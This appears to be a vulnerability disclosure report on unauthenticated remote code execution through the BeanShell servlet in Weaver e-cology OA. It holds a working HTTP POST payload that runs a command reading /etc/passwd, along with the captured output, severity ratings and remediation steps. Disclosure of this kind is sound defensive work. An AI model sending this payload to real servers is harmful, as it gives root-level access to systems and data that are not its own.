# 🛡️ Remote Code Execution (RCE) via BeanShell in Weaver e-cology

> [!IMPORTANT]
> **Vulnerability Discovery:** Identified a **Critical Unauthenticated Remote Code Execution (RCE)** in the Weaver e-cology OA system. 
> 
> By exploiting the BeanShell Test Servlet (`/bsh.servlet.BshServlet`), I successfully executed arbitrary system commands with **root** privileges.

---

## 🔍 Vulnerability Type
*   **Vulnerability Name:** Remote Code Execution (RCE) via BeanShell
*   **CVE/CNVD ID:** CNVD-2019-32204 (Critical)
*   **Attack Vector:** Unauthenticated Script Execution 

## 💥 Impact
This vulnerability allows for a **Complete Server Compromise**:

*   **Root Privilege Execution:** Ability to execute commands as `uid=0(root)`.
*   **Full Data Access:** Access to all corporate documents, HR data, and financial records stored in the OA system.
*   **System Persistence:** Ability to read sensitive system files (e.g., `/etc/passwd`) and gain permanent access to the OS.
*   **Lateral Movement:** The server can be used as a pivot point to attack the company's internal network (Intranet).

## 🛠️ Proof of Concept (PoC)

The vulnerability was exploited by sending a `POST` request to the BeanShell servlet with a command execution script: 

```http
POST /bsh.servlet.BshServlet HTTP/1.1
Host: <TARGET_IP>:<PORT>
Content-Type: application/x-www-form-urlencoded

bsh.script-exec("cat+/etc/passwd"); &bsh.servlet.output-raw
```

### 📸 Evidence
<img width="1909" height="401" alt="image" src="https://github.com/user-attachments/assets/804b7af9-2845-4be3-b018-ca3f57324b02" />

**Server Response (Exploited):**
The response contains the contents of `/etc/passwd`, confirming full system access: 
`root:ww@sffoqsk.EM:0:0:root:/root:/usr/bin/zsh`

---

## 📊 Severity


| Metric | Value |
| :--- | :--- |
| **Severity** | **CRITICAL** |
| **Privileges Required** | **None** |
| **CVSS Score** | **9.8 - 10.0** |

## 🛡️ Remediation

1.  **Disable Servlet:** Disable or delete the `BshServlet` if it is not required for production use.
2.  **Apply Patches:** Install the official security updates from Weaver for the e-cology platform. 
3.  **Access Control:** Restrict access to the `/bsh.servlet.*` endpoints using a firewall or WAF.

---
*Responsible disclosure. For educational and professional purposes only.*
